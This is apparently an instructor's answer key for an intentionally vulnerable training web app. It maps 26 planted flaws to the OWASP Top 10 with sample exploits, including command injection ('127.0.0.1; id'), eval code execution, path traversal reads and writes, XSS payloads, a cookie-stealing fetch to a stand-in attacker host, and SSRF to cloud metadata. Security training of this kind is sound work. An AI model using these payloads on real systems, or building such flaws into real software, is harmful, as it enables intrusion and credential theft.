# Vulnerability Answer Key

> Instructor/answer key. Remove this file before giving the app to testers.
> The app listens on 127.0.0.1 only by default. Keep it that way, or run it inside an isolated VM/container.

Mapped to the **OWASP Top 10 (2021)**.

| # | OWASP Category | Location | Vulnerability | Example Exploit |
|---|----------------|----------|---------------|-----------------|
| 1 | A01 Broken Access Control | `DELETE /api/assets/:id`, `GET /api/assets` | API has no authentication at all | `curl -X DELETE http://127.0.0.1:3000/api/assets/1` |
| 2 | A01 Broken Access Control | `POST /assets/:id/edit`, `POST /assets` | No role check: `viewer` can create and edit assets | Log in as `viewer` and edit any asset |
| 3 | A01 / A07 | `session` cookie | Session is unsigned base64 JSON, so the role can be forged | Set cookie to base64 of `{"username":"x","role":"admin"}` and delete assets |
| 4 | A01 Broken Access Control | `POST /assets/:id/edit` | Mass assignment via `Object.assign(asset, req.body)` lets you overwrite `id` and add arbitrary fields | Add an `id=999` field to the edit form |
| 5 | A01 Path Traversal | `GET /export/download?file=` | `path.join` with user input | `/export/download?file=../data/users.json` |
| 6 | A01 Path Traversal (write) | `POST /export` | Arbitrary file write location | `filename=../data/assets.json` (overwrites data); `../server.js` |
| 7 | A02 Cryptographic Failures | `data/users.json` | Passwords stored in plaintext | Read via #5 or #10 |
| 8 | A02 Cryptographic Failures | `config` in `server.js` | Hardcoded secrets in source | Read the source or `/debug` |
| 9 | A03 Injection: OS Command | `GET /assets/:id/ping` | `hostname` is concatenated into `exec()` | Set hostname to `127.0.0.1 & whoami` (Windows) or `127.0.0.1; id` (Linux), then click Ping |
| 10 | A03 Injection: Code (eval) | `POST /import` | `eval()` on user input = RCE | `data=require('fs').readFileSync('data/users.json','utf8')` → use `(()=>{...; return []})()` |
| 11 | A03 Injection: Reflected XSS | `GET /?q=` | Search term echoed unescaped | `/?q=<script>alert(document.cookie)</script>` |
| 12 | A03 Injection: Reflected XSS | `GET /login?error=` | Error message echoed unescaped | `/login?error=<img src=x onerror=alert(1)>` |
| 13 | A03 Injection: Stored XSS | Asset fields (notes, name, etc.) | Rendered unescaped in list/detail views and form `value=""` attributes | Notes: `<script>fetch('//attacker/?c='+document.cookie)</script>` |
| 14 | A04 Insecure Design | `POST /assets/:id/delete` etc. | No CSRF protection on state-changing forms | Auto-submitting form on another site posting to `/assets/1/delete` |
| 15 | A05 Security Misconfiguration | `GET /debug` | Unauthenticated endpoint dumps config, env vars, and all users with passwords | `curl http://127.0.0.1:3000/debug` |
| 16 | A05 Security Misconfiguration | Error handler | Full stack traces returned to the client | `/warranty?url=notaurl` |
| 17 | A05 Security Misconfiguration | Cookies / headers | Session cookie lacks `HttpOnly`, `Secure`, `SameSite`; no security headers; `X-Powered-By` exposed | Inspect response headers; steal cookie via #11 |
| 18 | A07 Identification & Auth Failures | `data/users.json` | Default credentials `admin/admin` | Log in as admin |
| 19 | A07 Identification & Auth Failures | `POST /login` | Username enumeration via different error messages | Compare "Unknown username" vs "Incorrect password" |
| 20 | A07 Identification & Auth Failures | `POST /login` | No rate limiting or lockout | Brute force with Hydra / Burp Intruder |
| 21 | A07 Identification & Auth Failures | `GET /logout` | Session is never invalidated server-side; old cookie works forever | Reuse a captured cookie after logout |
| 22 | A09 Logging & Monitoring Failures | Whole app | No logging of logins, failures, deletes, or admin actions | Attacks leave no trace |
| 23 | A10 SSRF | `GET /warranty?url=` | Server fetches any URL and returns the body | `/warranty?url=http://127.0.0.1:3000/debug`; cloud metadata `http://169.254.169.254/` |
| 24 | Info Disclosure | `GET /` (tools page) | Export filenames rendered unescaped in links | Combine with #6 to drop an XSS-named file |
| 25 | A06 Vulnerable & Outdated Components | `jquery@1.12.4` loaded at `/vendor/jquery/jquery.min.js` | Legacy jQuery has publicly known XSS vulnerabilities | Detect with `npm audit`; remediate by upgrading to a supported jQuery release and regression-testing the UI |
| 26 | A06 Vulnerable & Outdated Components | `bootstrap@3.3.7` loaded at `/vendor/bootstrap/{css,js}` | Legacy Bootstrap includes publicly known XSS vulnerabilities | Detect with `npm audit`; remediate by migrating to a supported Bootstrap release and updating the markup/classes |

## Not included
- **A08 Software & Data Integrity**: partly covered by #10 (untrusted data is evaluated as code).
